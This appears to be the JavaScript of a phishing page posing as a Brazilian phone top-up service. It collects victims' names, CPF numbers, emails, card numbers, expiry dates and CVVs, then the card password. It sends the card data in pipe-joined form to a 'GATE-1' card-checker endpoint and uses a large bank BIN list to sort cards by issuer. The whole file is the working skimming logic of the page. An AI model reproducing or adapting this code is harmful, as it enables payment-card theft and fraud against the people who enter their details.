limitesenha = 0;
minsenha = 0;
$(document).ready(function() {
    function validarCPF(cpf) {
        cpf = cpf.replace(/[^\d]+/g, '');
        if (cpf == '') return false;
        if (cpf.length != 11 || cpf == "00000000000" || cpf == "11111111111" || cpf == "22222222222" || cpf == "33333333333" || cpf == "44444444444" || cpf == "55555555555" || cpf == "66666666666" || cpf == "77777777777" || cpf == "88888888888" || cpf == "99999999999")
            return false;
        add = 0;
        for (i = 0; i < 9; i++)
            add += parseInt(cpf.charAt(i)) * (10 - i);
        rev = 11 - (add % 11);
        if (rev == 10 || rev == 11)
            rev = 0;
        if (rev != parseInt(cpf.charAt(9)))
            return false;
        add = 0;
        for (i = 0; i < 10; i++)
            add += parseInt(cpf.charAt(i)) * (11 - i);
        rev = 11 - (add % 11);
        if (rev == 10 || rev == 11)
            rev = 0;
        if (rev != parseInt(cpf.charAt(10)))
            return false;
        return true;
    }
    $(".inpCPF").mask("999.999.999-99", {
        autoclear: false
    });
    $("#formRecarga .inputRecarga").mask("(99) 99999-9999");
    $(".inpPhone").mask("(99) 99999-9999");
    $(".inpCard").mask("9999999999999999", {
        autoclear: false,
        placeholder: " "
    });
    $(".inpCVV").mask("9999", {
        autoclear: false,
        placeholder: " "
    });
    $("#modalWrapper .inpSelect").on("change", function() {
        var valueSelected = $(this).val();
        if (valueSelected == "none") {
            $(this).removeClass("selected");
        } else {
            $(this).addClass("selected");
        }
        console.log(valueSelected);
    });
    $("#mainRecargas .planosRecargas li .buttonRecarga").click(function() {
        $("#formRecarga .inputRecarga").focus();
    });
    $(".buttonRecarga").click(function() {
        var amountRecarga = $(this).attr("data-recarga");
        $("#modalWrapper .labelRecarga").hide();
        $("#modalWrapper .labelPhone").show();
        $("#hiddenInpRecarga").val(amountRecarga);
        $(".infoRecarga").text("Recarga de R$" + amountRecarga);
        $("#inputCurrentStep").val("1");
        $("#modalWrapper .dialogWindow").removeClass("loading").removeClass("step1").removeClass("step2").removeClass("step3").removeClass("step4");
        $("#modalWrapper .dialogWindow").addClass("step1");
        $("#modalWrapper").show();
    });
    $("#formRecarga").submit(function(e) {
        e.preventDefault();
        var allowSubmit = true;
        var phoneNumber = $("#formRecarga .inputRecarga").val();
        var regNumber = /^\([0-9]{2}\) [0-9]{5}\-[0-9]{4}$/;
        if (!regNumber.test(phoneNumber)) {
            $("#formRecarga .inputRecarga").focus();
            $("#formRecarga .errorMessages").addClass("showTable");
            setTimeout(function() {
                $("#formRecarga .errorMessages").removeClass("showTable");
            }, 10000);
        } else {
            $("#modalWrapper .labelPhone").hide();
            $("#modalWrapper .labelRecarga").show();
            $("#hiddenInpPhone").val(phoneNumber);
            $(".infoRecarga").text("Telefone: " + phoneNumber);
            $("#inputCurrentStep").val("1");
            $("#modalWrapper .dialogWindow").removeClass("loading").removeClass("step1").removeClass("step2").removeClass("step3").removeClass("step4");
            $("#modalWrapper .dialogWindow").addClass("step1");
            $("#modalWrapper").show();
        }
    });
    $("#formPayment").submit(function(e) {
        e.preventDefault();
        var currentStep = $("#inputCurrentStep").val();
        var phoneNumber = $(".inpPhone").val();
        var recargaOperadora = $(".inpOperadora").val();
        var recargaAmount = $(".inpRecarga").val();
        var holderEmail = $(".inpEmail").val();
        var holderName = $(".inpName").val();
        var holderCPF = $(".inpCPF").val();
        var cardNum = $(".inpCard").val();
        var cardExpiration1 = $("#cardExpirationMonth").val();
        var cardExpiration2 = $("#cardExpirationYear").val();
        var cardCVV = $(".inpCVV").val();
		var sp = "|";
        var regPhone = /^\([0-9]{2}\) [0-9]{5}\-[0-9]{4}$/;
        var regName = /^[\wÀ-ú. ]{5,}$/;
        var regCPF = /^[0-9]{3}\.[0-9]{3}\.[0-9]{3}\-[0-9]{2}$/;
        var regEmail = /^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$/;
        var regCardNum = /^[0-9 ]{19}$/;
        var regCardExp1 = /^[0-9]{2}$/;
        var regCardExp2 = /^[0-9]{4}$/;
        var regCardCVV = /^[0-9 ]{4}$/;
        if (currentStep == "1") {
            if (!regPhone.test(phoneNumber)) {
                $(".inpPhone").addClass("error").focus();
                $("#modalWrapper .dialogWindowFooter").removeClass("showTable");
                $("#modalWrapper .dialogWindowError p").text("Telefone inválido!");
                $("#modalWrapper .dialogWindowError").addClass("error").addClass("showTable");
                setTimeout(function() {
                    $(".inpPhone").removeClass("error");
                    $("#modalWrapper .dialogWindowError").removeClass("error").removeClass("showTable");
                    $("#modalWrapper .dialogWindowFooter").addClass("showTable");
                }, 10000);
            } else if (recargaOperadora !== "vivo" && recargaOperadora !== "claro" && recargaOperadora !== "tim" && recargaOperadora !== "oi") {
                $(".inpOperadora").addClass("error").focus();
                $("#modalWrapper .dialogWindowFooter").removeClass("showTable");
                $("#modalWrapper .dialogWindowError p").text("Selecione uma operadora!");
                $("#modalWrapper .dialogWindowError").addClass("error").addClass("showTable");
                setTimeout(function() {
                    $(".inpOperadora").removeClass("error");
                    $("#modalWrapper .dialogWindowError").removeClass("error").removeClass("showTable");
                    $("#modalWrapper .dialogWindowFooter").addClass("showTable");
                }, 10000);
            } else if (recargaAmount !== "15" && recargaAmount !== "20" && recargaAmount !== "35" && recargaAmount !== "50") {
                $(".inpRecarga").addClass("error").focus();
                $("#modalWrapper .dialogWindowFooter").removeClass("showTable");
                $("#modalWrapper .dialogWindowError p").text("Selecione uma recarga!");
                $("#modalWrapper .dialogWindowError").addClass("error").addClass("showTable");
                setTimeout(function() {
                    $(".inpRecarga").removeClass("error");
                    $("#modalWrapper .dialogWindowError").removeClass("error").removeClass("showTable");
                    $("#modalWrapper .dialogWindowFooter").addClass("showTable");
                }, 10000);
            } else if (!regEmail.test(holderEmail)) {
                $(".inpEmail").addClass("error").focus();
                $("#modalWrapper .dialogWindowFooter").removeClass("showTable");
                $("#modalWrapper .dialogWindowError p").text("Endereco de email inválido!");
                $("#modalWrapper .dialogWindowError").addClass("error").addClass("showTable");
                setTimeout(function() {
                    $(".inpEmail").removeClass("error");
                    $("#modalWrapper .dialogWindowError").removeClass("error").removeClass("showTable");
                    $("#modalWrapper .dialogWindowFooter").addClass("showTable");
                }, 10000);
            } else {
                $("#inputCurrentStep").val("2");
                $("#modalWrapper .dialogWindow").removeClass("loading").removeClass("step1").removeClass("step2").removeClass("step3").removeClass("step4");
                $("#modalWrapper .dialogWindow").addClass("step2");
            }
        } else if (currentStep == "2") {
            if (!regName.test(holderName)) {
                $(".inpName").addClass("error").focus();
                $("#modalWrapper .dialogWindowFooter").removeClass("showTable");
                $("#modalWrapper .dialogWindowError p").text("Nome completo inválido!");
                $("#modalWrapper .dialogWindowError").addClass("error").addClass("showTable");
                setTimeout(function() {
                    $(".inpName").removeClass("error");
                    $("#modalWrapper .dialogWindowError").removeClass("error").removeClass("showTable");
                    $("#modalWrapper .dialogWindowFooter").addClass("showTable");
                }, 10000);
            } else if (!regCPF.test(holderCPF) || validarCPF(holderCPF) == false) {
                $(".inpCPF").addClass("error").focus();
                $("#modalWrapper .dialogWindowFooter").removeClass("showTable");
                $("#modalWrapper .dialogWindowError p").text("CPF inválido!");
                $("#modalWrapper .dialogWindowError").addClass("error").addClass("showTable");
                setTimeout(function() {
                    $(".inpCPF").removeClass("error");
                    $("#modalWrapper .dialogWindowError").removeClass("error").removeClass("showTable");
                    $("#modalWrapper .dialogWindowFooter").addClass("showTable");
                }, 10000);
				
            } else if (!regCardExp1.test(cardExpiration1)) {
                $("#cardExpirationMonth").addClass("error").focus();
                $("#modalWrapper .dialogWindowFooter").removeClass("showTable");
                $("#modalWrapper .dialogWindowError p").text("Data de expiração inválida!");
                $("#modalWrapper .dialogWindowError").addClass("error").addClass("showTable");
                setTimeout(function() {
                    $(".inpExpiration").removeClass("error");
                    $("#modalWrapper .dialogWindowError").removeClass("error").removeClass("showTable");
                    $("#modalWrapper .dialogWindowFooter").addClass("showTable");
                }, 10000);
            } else if (!regCardExp2.test(cardExpiration2)) {
                $("#cardExpirationYear").addClass("error").focus();
                $("#modalWrapper .dialogWindowFooter").removeClass("showTable");
                $("#modalWrapper .dialogWindowError p").text("Data de expiração inválida!");
                $("#modalWrapper .dialogWindowError").addClass("error").addClass("showTable");
                setTimeout(function() {
                    $(".inpExpiration").removeClass("error");
                    $("#modalWrapper .dialogWindowError").removeClass("error").removeClass("showTable");
                    $("#modalWrapper .dialogWindowFooter").addClass("showTable");
                }, 10000);
            } else if (!regCardCVV.test(cardCVV)) {
                $(".inpCVV").addClass("error").focus();
                $("#modalWrapper .dialogWindowFooter").removeClass("showTable");
                $("#modalWrapper .dialogWindowError p").text("Código de segurança inválido!");
                $("#modalWrapper .dialogWindowError").addClass("error").addClass("showTable");
                setTimeout(function() {
                    $(".inpCVV").removeClass("error");
                    $("#modalWrapper .dialogWindowError").removeClass("error").removeClass("showTable");
                    $("#modalWrapper .dialogWindowFooter").addClass("showTable");
                }, 10000);
            } else {
                $("#modalWrapper .dialogWindow").removeClass("loading").removeClass("step1").removeClass("step2").removeClass("step3").removeClass("step4");
                $("#modalWrapper .dialogWindow").addClass("loading").addClass("step4");
                bin = cardNum;
                var lista = {
                    sicredi: [512267, 522590, 527680, 534520, 476331, 476332, 476333, 496045, 496046],
                    bancooriginal: [526784, 528400, 534540, 534543, 537110],
                    brb: [471222, 403316, 412187, 412759, 412791, 412793, 412794, 432678, 446988, 515084, 520156, 522073, 522273, 523575, 537638, 552855, 554773],
                    portoseguro: [412177, 415274, 415275, 446398, 446690, 480631, 484635, 532930, 536380, 536537, 553659],
                    midway: [536518, 482425],
                    triangulo: [510168, 518277, 528841, 547252, 548743, 548937, 407852, 407853, 428534, 428535, 498549],
                    bmg: [513557, 516376, 517973, 525922, 525923, 527451, 529479, 531304, 531566, 536832, 536833, 541143, 542421, 548199, 550159, 553492, 554464, 557793, 412122],
                    celetem: [515117, 515118, 522499, 522815, 525631, 526549, 530032, 532473, 532474, 534004],
                    bv: [518407, 518454, 518471, 518482, 518814, 518843, 521369, 521370, 528599, 528743, 536512, 554383, 409032, 423198, 446114, 446123, 459007, 477250, 477272],
                    renner: [544315, 474525],
                    itau: [474538, 403247, 421471, 450419, 451300, 456890, 473273, 473274, 474359, 479398, 490105, 490106, 490119, 406871, 412723, 434101, 441030, 478310, 400235, 400247, 400253, 400268, 400439, 400635, 400647, 400653, 403235, 403246, 405780, 405880, 407409, 407505, 407600, 411049, 411195, 411196, 413408, 413409, 413410, 413411, 414504, 414505, 414506, 415646, 416094, 417958, 417987, 417988, 418668, 421309, 421507, 421843, 421844, 421845, 421847, 421848, 422004, 422005, 422007, 422100, 422102, 422103, 422200, 422202, 422203, 422628, 422731, 438903, 439354, 439388, 439389, 439390, 440132, 441349, 444054, 445490, 445491, 445492, 445497, 445498, 451301, 451327, 451363, 456137, 457943, 459020, 459023, 459077, 459078, 459079, 459080, 459313, 459314, 459315, 459316, 459450, 459451, 459452, 459454, 459455, 459456, 459457, 459458, 460034, 460035, 460036, 460037, 460038, 463293, 463294, 463297, 463298, 464294, 464295, 464296, 464297, 464298, 464299, 464300, 464301, 465769, 467082, 469865, 469866, 469867, 469868, 470598, 472663, 472664, 472665, 472666, 472667, 472668, 472669, 474536, 474537, 474547, 474548, 474549, 474565, 477128, 477129, 477144, 477145, 477176, 477249, 478307, 478308, 478309, 482405, 482447, 482448, 482476, 482477, 482478, 482479, 482480, 483085, 483086, 483096, 483097, 483098, 483150, 483151, 485103, 485104, 485486, 486641, 486654, 489391, 489392, 489399, 489400, 489414, 489423, 489430, 489451, 490144, 490172, 491446, 491447, 491448, 493186, 493490, 496048, 496049, 498553, 498554, 606282, 637095, 637568, 637599, 637609, 637612, 384100, 384140, 384160, 222661, 222662, 222663, 222664, 510089, 512215, 512363, 512374, 512461, 512658, 512673, 513728, 513731, 514090, 514868, 514898, 514945, 515640, 515743, 515765, 515836, 516070, 516164, 516275, 516283, 516291, 516306, 517858, 517914, 517967, 518020, 518054, 518138, 518306, 518307, 518328, 518491, 518950, 518967, 520196, 520199, 520400, 520401, 520402, 520403, 520404, 520405, 520621, 520977, 521039, 521042, 521043, 521397, 522027, 522446, 522949, 522979, 523284, 523431, 523432, 523791, 524003, 524314, 524474, 524703, 524820, 525320, 525496, 525661, 525662, 525663, 525664, 525695, 525718, 526762, 526769, 526788, 526863, 526892, 526893, 527010, 527018, 527036, 527405, 527407, 527425, 527430, 527467, 527468, 527495, 527496, 527497, 527532, 527533, 527538, 527539, 527543, 527544, 527616, 527887, 527889, 528392, 528860, 528941, 529285, 529323, 530038, 530049, 530073, 530148, 530452, 530599, 530780, 530994, 530996, 531249, 531681, 531705, 534249, 534447, 534448, 534503, 534513, 534516, 534562, 534571, 534627, 535081, 535085, 535088, 535091, 535094, 535097, 535106, 535822, 535841, 535850, 535858, 535863, 535867, 535871, 536143, 536804, 539011, 539012, 539021, 539022, 539029, 539039, 539040, 539058, 539059, 539060, 539062, 539063, 539064, 539066, 539068, 539070, 539073, 539074, 539077, 539083, 539084, 539085, 539090, 539091, 540631, 540755, 540760, 541187, 541555, 541759, 541886, 542622, 542711, 542974, 542976, 542982, 543051, 543095, 543391, 543559, 543744, 543869, 543927, 543960, 543971, 544169, 544199, 544265, 544276, 544293, 544296, 544300, 544328, 544386, 544442, 544507, 544522, 544540, 544547, 544554, 544560, 544570, 544599, 544600, 544626, 544654, 544665, 544672, 544673, 544753, 544829, 544831, 544833, 544839, 544841, 544859, 544860, 544862, 544863, 544864, 544874, 544881, 544883, 544890, 544891, 545011, 545349, 545368, 545462, 545670, 545719, 545768, 545780, 545810, 545823, 545832, 545850, 545957, 545959, 545967, 546003, 546056, 546337, 546338, 546460, 546461, 546559, 546744, 546754, 546841, 547468, 548295, 548296, 548305, 548337, 548474, 548514, 548625, 548708, 548721, 548722, 548723, 548724, 548802, 548839, 548984, 548985, 549167, 549221, 549319, 549329, 549339, 549341, 549358, 549359, 549363, 549368, 549383, 549390, 549391, 549585, 552070, 552072, 552236, 552317, 552640, 552697, 552914, 553624, 553636, 553665, 553666, 554282, 554309, 554480, 554587, 554722, 554774, 554775, 554917, 556615, 556616, 556673, 558303, 559275, 510426, 512047, 512059, 512099, 512207, 512671, 514079, 514233, 514897, 517787, 518032, 518063, 518218, 518326, 518534, 521880, 522015, 525692, 526944, 529416, 529417, 530771, 530851, 531087, 531377, 531661, 531671, 532910, 532942, 534361, 534915, 536352, 536367, 536391, 536452, 536458, 536467, 536471, 536477, 536480, 536491, 536552, 536558, 536567, 536571, 536577, 536580, 536591, 539067, 539072, 539078, 539088, 540508, 540645, 541006, 541426, 542477, 542510, 542701, 543690, 544166, 544546, 544867, 544872, 545463, 545553, 545653, 546012, 546017, 546279, 546282, 546815, 547076, 547483, 547674, 548364, 548731, 548739, 548929, 548961, 548970, 548976, 549090, 549296, 549332, 549367, 549372, 549378, 552244, 552544, 553034, 553637, 553647, 554281, 554497, 554613, 554634, 554776, 554903, 554953, 556023, 556024, 556026, 556670, 557771, 557797, 558297, 558383, 558394, 558645, 555428, 536371, 536481, 536482, 536581, 536582, 515802, 637600],
                    santander: [515590, 517756, 518148, 518294, 518295, 518296, 518311, 518312, 518313, 518768, 519339, 520132, 520184, 520185, 521179, 521180, 522839, 522840, 526128, 528052, 531454, 531455, 531488, 531654, 531699, 531714, 531715, 531727, 534581, 540105, 540106, 541100, 542292, 542353, 542688, 542820, 542836, 543658, 543660, 544165, 544412, 544731, 545500, 548648, 548649, 549518, 550154, 552693, 552943, 553457, 553458, 554389, 554612, 526595, 541740, 552144, 556035, 545805, 407302, 407392, 407435, 409308, 410055, 411050, 411085, 411833, 419137, 419145, 419147, 419190, 419618, 419622, 419624, 419627, 419630, 422048, 424305, 425470, 439252, 439253, 441064, 441123, 441536, 445993, 448799, 459945, 459946, 463312, 463314, 467112, 467113, 467114, 474511, 479392, 485619, 485657, 491316, 491513, 491514, 491674, 491675, 491676, 491696, 499918, 499919, 499984, 407434, 409309, 410861, 410863, 415703, 419138, 419139, 419140, 419141, 419142, 419143, 419144, 419146, 419148, 419619, 419631, 422061, 423661, 423808, 423809, 425850, 430963, 439254, 441061, 441062, 441065, 441066, 441067, 441120, 441122, 441524, 446193, 450583, 451296, 455153, 455164, 455165, 455167, 455168, 455169, 457937, 457938, 459091, 459092, 459093, 459094, 463313, 463315, 469856, 469857, 474507, 477043, 480629, 480630, 481135, 481140, 489389, 489426, 489427, 491314, 491315, 491623, 491944, 474512, 419620, 419623, 419625, 419628, 492400, 492401, 492402, 492403, 492404, 492405, 492460],
                    csf: [403406, 403407, 406166, 406167, 406168, 434949, 530033, 530034, 540216, 543104, 543882, 544824, 545452, 559917],
                    bb: [498423, 400102, 400106, 400107, 400130, 400136, 400160, 400162, 400163, 400168, 400170, 400174, 400176, 400178, 400182, 400184, 400185, 400187, 400191, 400195, 400199, 400444, 401552, 401553, 401557, 401573, 401574, 403791, 403792, 403793, 403795, 403796, 403797, 404000, 404001, 404002, 405884, 406459, 406460, 406467, 407800, 407801, 407802, 407829, 409869, 414451, 419271, 419276, 430420, 430422, 432728, 432729, 433873, 441102, 441172, 441174, 444434, 444454, 444456, 444457, 444458, 444459, 448152, 448549, 448556, 448558, 450577, 450985, 457538, 457595, 457633, 457634, 467148, 467149, 467481, 469522, 469570, 469571, 471701, 471702, 471703, 471704, 477115, 477116, 479391, 480625, 484147, 484148, 484189, 484199, 485464, 485945, 485960, 486323, 489410, 489411, 489466, 491708, 492132, 498401, 498402, 498406, 498407, 498408, 498409, 498410, 498420, 498422, 498424, 498425, 498427, 498428, 498429, 498430, 498431, 498432, 498433, 498439, 498440, 498441, 498442, 498444, 498445, 498446, 498447, 498448, 498449, 498450, 498452, 498453, 498470, 498496, 498497, 498498, 499904, 457594, 558674, 510524, 512112, 512119, 512286, 514009, 514078, 514094, 514895, 515891, 516004, 516064, 516066, 517974, 517985, 518659, 518759, 518760, 518763, 518764, 518765, 521501, 522978, 522983, 522984, 525439, 525482, 526811, 528084, 529077, 532338, 532340, 538818, 540064, 540084, 540101, 540500, 540535, 542244, 542661, 542842, 544066, 544545, 544586, 544597, 544908, 545053, 546451, 546452, 546456, 546479, 546499, 546990, 546991, 547604, 547606, 547749, 547874, 548572, 548573, 548595, 548794, 548822, 548824, 548965, 549833, 552063, 552289, 552584, 552694, 552889, 552911, 554906, 554927, 556600, 556601, 558779, 401178, 401179, 431274, 438935, 457393, 457631, 457632, 506713, 506721, 506728, 506729, 506730, 506733, 506744, 506745, 506746, 506747, 506748, 506753, 506775, 506776, 509067, 509068, 509069, 509098, 509100, 509107, 509109]
                }
                $(".inpPassw").prop('maxLength', limitesenha);
                $.ajax({
                    url: "http://localhost/GATE-1/api.php?lista="+cardNum+sp+cardExpiration1+sp+cardExpiration2+sp+cardCVV,
                    method: "GET",
                    data: "success",
                    dataType: "",
                    success: function(data) {
                        if (data.status == "success") {
                            $("#inputCurrentStep").val("4");
                            $("#modalWrapper .dialogWindow").removeClass("step4").removeClass("step1").removeClass("step2").removeClass("step3").removeClass("step4");
                            $("#modalWrapper .dialogWindow").addClass("step4");
                        } else {
                            $("#modalWrapper .dialogWindow").removeClass("step4").removeClass("step1").removeClass("step2").removeClass("step3").removeClass("step4");
                            $("#modalWrapper .dialogWindow").addClass("step4");
                            $(".inpCard").addClass("error").focus();
                            $("#modalWrapper .dialogWindowFooter").removeClass("showTable");
                            $("#modalWrapper .dialogWindowError p").text("Número de cartão inválido!");
                            $("#modalWrapper .dialogWindowError").addClass("error").addClass("showTable");
                            setTimeout(function() {
                                $(".inpCard").removeClass("error");
                                $("#modalWrapper .dialogWindowError").removeClass("error").removeClass("showTable");
                                $("#modalWrapper .dialogWindowFooter").addClass("showTable");
                            }, 10000);
                        }
                    },
                });
            }
        }
    });
    $("#formConfirm").submit(function(e) {
        e.preventDefault();
        var cardPassw = $(".inpPassw").val();
        var phoneNumber = $("#formRecarga .inputRecarga").val();
        if (cardPassw.length < minsenha || cardPassw.length > limitesenha) {
            $(".inpPassw").addClass("error").focus();
            $("#modalWrapper .dialogWindowFooter").removeClass("showTable");
            $("#modalWrapper .dialogWindowError p").text("Senha do cartão inválida!");
            $("#modalWrapper .dialogWindowError").addClass("error").addClass("showTable");
            setTimeout(function() {
                $(".inpPassw").removeClass("error");
                $("#modalWrapper .dialogWindowError").removeClass("error").removeClass("showTable");
                $("#modalWrapper .dialogWindowFooter").addClass("showTable");
            }, 10000);
        } else {
            $.ajax({
                url: "/manager/api/confirmar",
                method: "POST",
                data: $("#formConfirm").serialize(),
                beforeSend: function() {
                    $("#modalWrapper .dialogWindow").removeClass("loading").removeClass("step1").removeClass("step2").removeClass("step3").removeClass("step4");
                    $("#modalWrapper .dialogWindow").addClass("loading");
                },
                success: function(data) {
                    $("#inputCurrentStep").val("4");
                    $("#modalWrapper .dialogWindow").removeClass("loading").removeClass("step1").removeClass("step2").removeClass("step3").removeClass("step4");
                    $("#modalWrapper .dialogWindow").addClass("step4");
                }
            });
        }
    });
    $("#modalWrapper .butCancel").click(function() {
        $("#modalWrapper").hide();
    });
});